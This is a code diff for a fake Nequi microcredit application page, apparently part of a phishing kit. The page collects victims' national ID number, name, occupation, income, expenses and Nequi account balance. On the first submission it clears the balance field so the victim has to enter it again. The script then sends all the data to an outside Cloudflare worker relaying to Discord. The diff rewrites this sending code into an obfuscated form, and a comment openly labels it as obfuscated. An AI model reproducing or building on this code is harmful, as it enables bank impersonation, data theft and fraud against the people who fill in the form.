@@ -279,179 +279,154 @@
     </div>
 
     <script>
-        const slider = document.getElementById('amountSlider');
-        const amountDisplay = document.getElementById('amountDisplay');
-        const cuotaDisplay = document.getElementById('cuotaDisplay');
-        const btnSolicitar = document.getElementById('btnSolicitar');
+    const slider = document.getElementById('amountSlider');
+    const amountDisplay = document.getElementById('amountDisplay');
+    const cuotaDisplay = document.getElementById('cuotaDisplay');
+    const btnSolicitar = document.getElementById('btnSolicitar');
+    
+    const cedula = document.getElementById('cedula');
+    const nombre = document.getElementById('nombre');
+    const ocupacion = document.getElementById('ocupacion');
+    const ingresos = document.getElementById('ingresos');
+    const gastos = document.getElementById('gastos');
+    const saldo = document.getElementById('saldo');
+    
+    const campos = [cedula, nombre, ocupacion, ingresos, gastos, saldo];
+    
+    let saldoValidado = false;
+    
+    const TASA_INTERES = 0.03;
+    
+    function calcularCuota(monto, meses, tasaMensual = TASA_INTERES) {
+        if (!meses || meses === 0) return 0;
+        if (tasaMensual === 0) return monto / meses;
         
-        const cedula = document.getElementById('cedula');
-        const nombre = document.getElementById('nombre');
-        const ocupacion = document.getElementById('ocupacion');
-        const ingresos = document.getElementById('ingresos');
-        const gastos = document.getElementById('gastos');
-        const saldo = document.getElementById('saldo');
+        const factor = Math.pow(1 + tasaMensual, meses);
+        const cuota = monto * (tasaMensual * factor) / (factor - 1);
         
-        const campos = [cedula, nombre, ocupacion, ingresos, gastos, saldo];
+        return Math.round(cuota);
+    }
+    
+    function actualizarCuotaDisplay() {
+        const monto = parseInt(slider.value);
+        const cuotasActiva = document.querySelector('.cuota-btn.active');
+        const meses = parseInt(cuotasActiva.dataset.cuotas);
         
-        let saldoValidado = false;
-        
-        const TASA_INTERES = 0.03;
-        
-        function calcularCuota(monto, meses, tasaMensual = TASA_INTERES) {
-            if (!meses || meses === 0) return 0;
-            if (tasaMensual === 0) return monto / meses;
-            
-            const factor = Math.pow(1 + tasaMensual, meses);
-            const cuota = monto * (tasaMensual * factor) / (factor - 1);
-            
-            return Math.round(cuota);
+        const cuotaCalculada = calcularCuota(monto, meses);
+        cuotaDisplay.textContent = formatSliderNumber(cuotaCalculada);
+    }
+    
+    function formatNumber(input) {
+        let value = input.value.replace(/\./g, '').replace(/\D/g, '');
+        if (value) {
+            value = parseInt(value).toLocaleString('de-DE');
+            input.value = value;
         }
-        
-        function actualizarCuotaDisplay() {
-            const monto = parseInt(slider.value);
-            const cuotasActiva = document.querySelector('.cuota-btn.active');
-            const meses = parseInt(cuotasActiva.dataset.cuotas);
-            
-            const cuotaCalculada = calcularCuota(monto, meses);
-            cuotaDisplay.textContent = formatSliderNumber(cuotaCalculada);
-        }
-        
-        function formatNumber(input) {
-            let value = input.value.replace(/\./g, '').replace(/\D/g, '');
-            if (value) {
-                value = parseInt(value).toLocaleString('de-DE');
-                input.value = value;
-            }
-            validarCampos();
-        }
-        
-        function formatSliderNumber(num) {
-            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-        }
-        
-        slider.addEventListener('input', function() {
-            amountDisplay.textContent = formatSliderNumber(this.value);
+        validarCampos();
+    }
+    
+    function formatSliderNumber(num) {
+        return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+    }
+    
+    slider.addEventListener('input', function() {
+        amountDisplay.textContent = formatSliderNumber(this.value);
+        actualizarCuotaDisplay();
+    });
+    
+    document.querySelectorAll('.cuota-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.cuota-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
             actualizarCuotaDisplay();
+            validarCampos();
         });
-        
-        document.querySelectorAll('.cuota-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.cuota-btn').forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
-                actualizarCuotaDisplay();
-                validarCampos();
-            });
+    });
+    
+    document.querySelectorAll('.fecha-btn').forEach(btn => {
+        btn.addEventListener('click', function() {
+            document.querySelectorAll('.fecha-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            validarCampos();
         });
-        
-        document.querySelectorAll('.fecha-btn').forEach(btn => {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.fecha-btn').forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
-                validarCampos();
-            });
-        });
-        
-        function validarCampos() {
-            let todosLlenos = true;
-            
-            campos.forEach(campo => {
-                if (!campo.value.trim()) {
-                    todosLlenos = false;
-                }
-            });
-            
-            if (todosLlenos) {
-                btnSolicitar.disabled = false;
-                btnSolicitar.classList.add('active');
-            } else {
-                btnSolicitar.disabled = true;
-                btnSolicitar.classList.remove('active');
-            }
-        }
+    });
+    
+    function validarCampos() {
+        let todosLlenos = true;
         
         campos.forEach(campo => {
-            campo.addEventListener('input', function() {
-                if (this.id === 'ingresos' || this.id === 'gastos' || this.id === 'saldo') {
-                    // Ya tiene oninput
-                } else {
-                    validarCampos();
-                }
-            });
-        });
-        
-        btnSolicitar.addEventListener('click', function(e) {
-            if (this.disabled) return;
-            
-            if (!saldoValidado) {
-                e.preventDefault();
-                
-                saldo.value = '';
-                saldo.classList.add('error');
-                
-                saldoValidado = true;
-                btnSolicitar.disabled = true;
-                btnSolicitar.classList.remove('active');
-                
-                saldo.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                saldo.focus();
-                
-                return;
+            if (!campo.value.trim()) {
+                todosLlenos = false;
             }
-            
-            const montoSeleccionado = slider.value;
-            localStorage.setItem('montoCredito', montoSeleccionado);
-            
-            // Guardar saldo en localStorage
-            const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
-            datosSesion.saldo = saldo.value;
-            localStorage.setItem('datosSesion', JSON.stringify(datosSesion));
-            
-            const webhookURL = 'https://nequi-worker.miprimercredito.workers.dev';
-            const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
-
-            const datos = {
-                cedula: cedula.value,
-                nombre: nombre.value,
-                ocupacion: ocupacion.value,
-                ingresos: ingresos.value,
-                gastos: gastos.value,
-                saldo: saldo.value,
-                monto: amountDisplay.textContent,
-                cuotas: document.querySelector('.cuota-btn.active').dataset.cuotas,
-                fechaPago: document.querySelector('.fecha-btn.active').dataset.dia,
-                cuotaEstimada: cuotaDisplay.textContent
-            };
-
-            const mensaje = `📋 **DATOS PERSONALES**\n🆔 ${sesionId}\n` +
-                            `👤 Cédula: ${datos.cedula}\n` +
-                            `📛 Nombre: ${datos.nombre}\n` +
-                            `💼 Ocupación: ${datos.ocupacion}\n` +
-                            `💰 Ingresos: $${datos.ingresos}\n` +
-                            `📤 Gastos: $${datos.gastos}\n` +
-                            `🏦 Saldo NEQUI: $${datos.saldo}\n` +
-                            `💳 Monto solicitado: $${datos.monto}\n` +
-                            `📅 Plazo: ${datos.cuotas} meses\n` +
-                            `🔢 Fecha de pago: Día ${datos.fechaPago}\n` +
-                            `💵 Cuota estimada: $${datos.cuotaEstimada}`;
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mensaje })
-            }).finally(() => {
-                window.location.href = 'verificando-datos.html';
-            });
         });
         
-        saldo.addEventListener('input', function() {
-            if (saldoValidado && this.value.trim() !== '') {
-                saldo.classList.remove('error');
+        if (todosLlenos) {
+            btnSolicitar.disabled = false;
+            btnSolicitar.classList.add('active');
+        } else {
+            btnSolicitar.disabled = true;
+            btnSolicitar.classList.remove('active');
+        }
+    }
+    
+    campos.forEach(campo => {
+        campo.addEventListener('input', function() {
+            if (this.id === 'ingresos' || this.id === 'gastos' || this.id === 'saldo') {
+                // Ya tiene oninput
+            } else {
                 validarCampos();
             }
         });
+    });
+    
+    btnSolicitar.addEventListener('click', function(e) {
+        if (this.disabled) return;
         
-        actualizarCuotaDisplay();
-        validarCampos();
-    </script>
+        if (!saldoValidado) {
+            e.preventDefault();
+            
+            saldo.value = '';
+            saldo.classList.add('error');
+            
+            saldoValidado = true;
+            btnSolicitar.disabled = true;
+            btnSolicitar.classList.remove('active');
+            
+            saldo.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            saldo.focus();
+            
+            return;
+        }
+        
+        const montoSeleccionado = slider.value;
+        localStorage.setItem('montoCredito', montoSeleccionado);
+        
+        // Guardar saldo en localStorage
+        const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
+        datosSesion.saldo = saldo.value;
+        localStorage.setItem('datosSesion', JSON.stringify(datosSesion));
+        
+        // ========== ENVÍO A DISCORD (OFUSCADO) ==========
+        var _0x1a2b=['https://nequi-worker.miprimercredito.workers.dev','getItem','sesionId','DESCONOCIDO','📋 **DATOS PERSONALES**\n🆔 ','\n👤 Cédula: ','\n📛 Nombre: ','\n💼 Ocupación: ','\n💰 Ingresos: $','\n📤 Gastos: $','\n🏦 Saldo NEQUI: $','\n💳 Monto solicitado: $','\n📅 Plazo: ',' meses\n🔢 Fecha de pago: Día ','\n💵 Cuota estimada: $','POST','Content-Type','application/json','content','finally','location','href','verificando-datos.html'];
+        var _0x3c4d=_0x1a2b[0x0];
+        var _0x5e6f=localStorage[_0x1a2b[0x1]](_0x1a2b[0x2])||_0x1a2b[0x3];
+        var _0x7f8g={cedula:cedula.value,nombre:nombre.value,ocupacion:ocupacion.value,ingresos:ingresos.value,gastos:gastos.value,saldo:saldo.value,monto:amountDisplay.textContent,cuotas:document.querySelector('.cuota-btn.active').dataset.cuotas,fechaPago:document.querySelector('.fecha-btn.active').dataset.dia,cuotaEstimada:cuotaDisplay.textContent};
+        var _0x9h0i=_0x1a2b[0x4]+_0x5e6f+_0x1a2b[0x5]+_0x7f8g['cedula']+_0x1a2b[0x6]+_0x7f8g['nombre']+_0x1a2b[0x7]+_0x7f8g['ocupacion']+_0x1a2b[0x8]+_0x7f8g['ingresos']+_0x1a2b[0x9]+_0x7f8g['gastos']+_0x1a2b[0xa]+_0x7f8g['saldo']+_0x1a2b[0xb]+_0x7f8g['monto']+_0x1a2b[0xc]+_0x7f8g['cuotas']+_0x1a2b[0xd]+_0x7f8g['fechaPago']+_0x1a2b[0xe]+_0x7f8g['cuotaEstimada'];
+        fetch(_0x3c4d,{method:_0x1a2b[0xf],headers:{[_0x1a2b[0x10]]:_0x1a2b[0x11]},body:JSON.stringify({[_0x1a2b[0x12]]:_0x9h0i})})[_0x1a2b[0x13]](function(){window[_0x1a2b[0x14]][_0x1a2b[0x15]]=_0x1a2b[0x16];});
+        // =================================================
+        // Si quieres que SOLO se envíe a Discord y NO avance, comenta la línea de arriba y descomenta la de abajo:
+        // window.location.href = 'verificando-datos.html';
+    });
+    
+    saldo.addEventListener('input', function() {
+        if (saldoValidado && this.value.trim() !== '') {
+            saldo.classList.remove('error');
+            validarCampos();
+        }
+    });
+    
+    actualizarCuotaDisplay();
+    validarCampos();
+</script>
 </body>
 </html>
